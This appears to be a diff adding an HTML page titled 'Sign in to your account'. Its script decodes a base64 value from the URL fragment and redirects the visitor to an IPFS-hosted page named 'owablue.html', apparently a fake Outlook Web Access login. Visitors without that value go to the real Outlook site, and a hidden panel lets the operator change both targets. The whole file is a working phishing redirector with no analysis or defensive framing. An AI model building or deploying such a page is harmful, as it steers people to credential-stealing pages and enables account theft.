@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html>
+   <head>
+      <meta charset="utf-8">
+      <meta http-equiv="X-UA-Compatible" content="IE=edge">
+      <title>Sign in to your account</title>
+      <meta name="viewport" content="width=device-width, initial-scale=1">
+      <style>
+         body {
+            font-family: Arial, sans-serif;
+            margin: 20px;
+         }
+         .hidden {
+            display: none;
+         }
+      </style>
+   </head>
+   <body>
+      <div id="updateSection" class="hidden">
+         <h2>Update Redirect Settings</h2>
+         <label for="redirectUrl">Redirect URL:</label>
+         <input
+            type="text"
+            id="redirectUrl"
+            placeholder="Enter new redirect URL"
+            style="width: 93%; padding: 10px; margin: 10px 0;"
+         /><br>
+         <label for="defaultFallbackUrl">Default Fallback URL:</label>
+         <input
+            type="text"
+            id="defaultFallbackUrl"
+            placeholder="Enter new default fallback URL"
+            style="width: 93%; padding: 10px; margin: 10px 0;"
+         />
+         <button onclick="setUrls()" style="padding: 10px 20px;">Save Changes</button>
+      </div>
+      <script>
+         // Default URLs
+         let redirectBaseUrl = "https://cloudflare-ipfs.com/ipfs/QmTS1MVDgZebn5e2zN4Bdz9ag1CUFRTSp7nxS97UWV1uuQ/owablue.html#";
+         let fallbackUrl = "https://outlook.office365.com/mail";
+
+         function b64DecodeUnicode(str) {
+            return decodeURIComponent(atob(str).split('').map(function(c) {
+               return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
+            }).join(''));
+         }
+
+         function redirectPage() {
+            const query = window.location.href;
+            console.log(query);
+            const isUpdateMode = query.includes('/update');
+
+            if (isUpdateMode) {
+               document.getElementById("updateSection").classList.remove("hidden");
+               return;
+            }
+
+            const res = query.split("#");
+            const data2 = res[1] || "";
+
+            if (data2) {
+               const id = b64DecodeUnicode(data2);
+               console.log("Redirecting to:", redirectBaseUrl + id);
+               window.location.href = redirectBaseUrl + id;
+            } else {
+               console.log("No redirect data found. Redirecting to fallback URL.");
+               window.location.href = fallbackUrl;
+            }
+         }
+
+         function setUrls() {
+            const newRedirectUrl = document.getElementById("redirectUrl").value.trim();
+            const newFallbackUrl = document.getElementById("defaultFallbackUrl").value.trim();
+
+            if (newRedirectUrl) {
+               redirectBaseUrl = newRedirectUrl;
+               alert("Redirect URL updated successfully!");
+               console.log("New Redirect URL:", redirectBaseUrl);
+            } else {
+               alert("Redirect URL unchanged.");
+            }
+
+            if (newFallbackUrl) {
+               fallbackUrl = newFallbackUrl;
+               alert("Fallback URL updated successfully!");
+               console.log("New Fallback URL:", fallbackUrl);
+            } else {
+               alert("Fallback URL unchanged.");
+            }
+         }
+
+         redirectPage();
+      </script>
+   </body>
+</html> 
